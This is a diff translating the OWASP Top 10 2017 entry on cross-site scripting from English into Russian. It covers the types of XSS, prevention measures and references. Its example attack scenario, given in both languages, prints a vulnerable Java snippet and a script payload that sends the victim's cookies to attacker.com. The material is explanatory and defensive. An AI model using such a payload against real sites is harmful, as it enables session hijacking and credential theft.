@@ -1,58 +1,62 @@
-# A7:2017 Cross-Site Scripting (XSS)
+# A7:2017 Межсайтовое выполнение сценариев (XSS)
 
-| Threat agents/Attack vectors | Security Weakness           | Impacts               |
+| Источники угроз/Векторы атак | Недостатки безопасности           | Последствия               |
 | -- | -- | -- |
-| Access Lvl : Exploitability 3 | Prevalence 3 : Detectability 3 | Technical 2 : Business |
-| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
+| Зависит от прил. : Сложность эксплуатации 3 | Распространённость 3 : Сложность обнаружения 3 | Технические 2 : Для бизнеса ? |
+| Автоматизированные инструменты могут обнаруживать и эксплуатировать все три вида межсайтового выполнения сценариев, более того, фреймворки для их эксплуатации можно найти в открытом доступе.  | Межсайтовое выполнение сценариев (XSS) является второй по распространенности уязвимостью из Топ-10 OWASP и обнаруживается в двух третях всех приложений. Автоматизированные инструменты могут обнаруживать XSS автоматически, особенно в случае проработанных технологий, таких как PHP, J2EE / JSP и ASP.NET. | Межсайтовое выполнение сценариев будет иметь последствия средней степени тяжести в случае отраженного XSS или XSS на основе объектной модели документа и серьезные последствия в случае межсайтового выполнения хранимых сценариев с удаленным выполнением кода в браузере пользователя, например, кража учетных данных, перехват сессий или установка вредоносного ПО. |
 
-## Is the Application Vulnerable?
+## Является ли приложение уязвимым?
 
-There are three forms of XSS, usually targeting users' browsers:
+Существует три типа XSS, обычно эксплуатируемых в браузерах:
 
-* **Reflected XSS**: The application or API includes unvalidated and unescaped user input as part of HTML output. A successful attack can allow the attacker to execute arbitrary HTML and JavaScript in the victim’s browser. Typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements, or similar.
-* **Stored XSS**: The application or API stores unsanitized user input that is viewed at a later time by another user or an administrator. Stored XSS is often considered a high or critical risk.
-* **DOM XSS**: JavaScript frameworks, single-page applications, and APIs that dynamically include attacker-controllable data to a page are vulnerable to DOM XSS. Ideally, the application would not send attacker-controllable data to unsafe JavaScript APIs.
+* __Отраженное XSS__: Приложение или API включает непроверенные и неэкранированные данные в состав HTML. Успешная атака может привести к выполнению произвольного HTML- и JavaScript-кода в браузере жертвы. Обычно злоумышленнику необходимо убедить пользователя перейти по ссылке, ведущей на вредоносную страницу, например, используя атаку типа "водопой" или рекламу.
+* __Межсайтовое выполнение хранимых сценариев__: Приложение или API сохраняет необработанные входные данные, с которыми затем взаимодействуют пользователи или администраторы. Межсайтовое выполнение хранимых сценариев обычно считается очень опасной уязвимостью.
+* __XSS на основе объектной модели документа (ОМД)__: JavaScript-фреймворки, одностраничные приложения и API, динамически добавляющие вредоносные данные на страницы, подвержены XSS на основе ОМД. В идеале, приложение не должно отправлять вредоносные данные небезопасным JavaScript API.
 
-Typical XSS attacks include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user's browser such as malicious software downloads, key logging, and other client-side attacks.
+Обычно XSS используется для перехвата сессий, кражи учетных записей, обхода МФА, замены или подмены узлов ОМД (напр., троянские панели входа в систему), а также атак на браузеры, например, для загрузки вредоносного ПО, регистрации нажатий и других атак на стороне клиента.
 
-## How To Prevent
+## Как предотвратить
 
-Preventing XSS requires separation of untrusted data from active browser content. This can be achieved by:
+Для предотвращения XSS необходимо отделять непроверенные данные от активного контента браузера. Этого можно достичь следующими способами:
 
-* Using frameworks that automatically escape XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework's XSS protection and appropriately handle the use cases which are not covered.
-* Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve Reflected and Stored XSS vulnerabilities. The [OWASP  Cheat Sheet 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.
-* Applying context-sensitive encoding when modifying the browser document on the client side acts against DOM XSS. When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the OWASP Cheat Sheet 'DOM based XSS Prevention'.
-* Enabling a [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) as a defense-in-depth mitigating control against XSS. It is effective if no other vulnerabilities exist that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks).
+* Использовать фреймворки с автоматическим экранированием данных, как в последних версиях Ruby on Rails и React JS. Необходимо также проанализировать ограничения XSS-защиты каждого фреймворка и обеспечить соответствующую обработку этих исключений.
+* Экранировать недоверенные данные из HTTP-запросов, основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS и межсайтового выполнения хранимых сценариев. ["Памятка OWASP: Предотвращение XSS"](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) содержит подробные инструкции по экранированию данных.
+* Применять контекстное кодирование при изменении документа в браузере пользователя для предотвращения XSS на основе ОМД. Если это невозможно, то применять контекстное кодирование к API браузера (см. ["Памятку OWASP: Предотвращение XSS на основе ОМД"](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)).
+* Использовать [политику защиты содержимого (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) для предотвращения XSS. Эта мера эффективна, если отсутствуют уязвимости, позволяющие внедрить код через локальные файлы (напр., используя подмену путей или уязвимые библиотеки из разрешенных сетей доставки контента).
 
-## Example Attack Scenario
+## Примеры сценариев атак
 
-**Scenario #1**: The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:
+**Сценарий №1**: Приложение использует непроверенные данные при создании HTML-сниппета без их подтверждения или экранирования:
 
-`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
-The attacker modifies the ‘CC’ parameter in the browser to:
+```
+(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";
+```
+Злоумышленник меняет параметр 'CC' в браузере на:
 
-`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
+```
+'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'
+```
 
-This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
+Идентификатор сессии жертвы отправляется на сайт злоумышленника, позволяя атакующему перехватить текущую сессию пользователя.
 
-**Note**: Attackers can use XSS to defeat any automated Cross-Site Request Forgery (CSRF) defense the application might employ.
+**Примечание**: злоумышленник может использовать XSS для обхода защиты от межсайтовой подмены запросов (CSRF), используемой в приложении.
 
-## References
+## Ссылки
 
 ### OWASP
 
-* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [Проактивная защита OWASP: Кодирование данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
+* [Проактивная защита OWASP: Проверка данных](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
+* [Стандарт подтверждения безопасности приложений OWASP: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
+* [Руководство OWASP по тестированию: Отраженное межсайтовое выполнение сценариев](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
+* [Руководство OWASP по тестированию: Межсайтовое выполнение хранимых сценариев](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
+* [Руководство OWASP по тестированию: XSS на основе объектной модели документа](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
+* [Памятка OWASP: Предотвращение XSS](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+* [Памятка OWASP: Предотвращение XSS на основе ОМД](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
+* [Памятка OWASP: Обход фильтра XSS](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+* [Проект кодировщика Java от OWASP](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
 
-### External
+### Сторонние
 
-* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
-* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
+* [CWE-79: Некорректная нейтрализация входных данных от пользователей](https://cwe.mitre.org/data/definitions/79.html)
+* [PortSwigger: Внедрение в пользовательские шаблоны](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
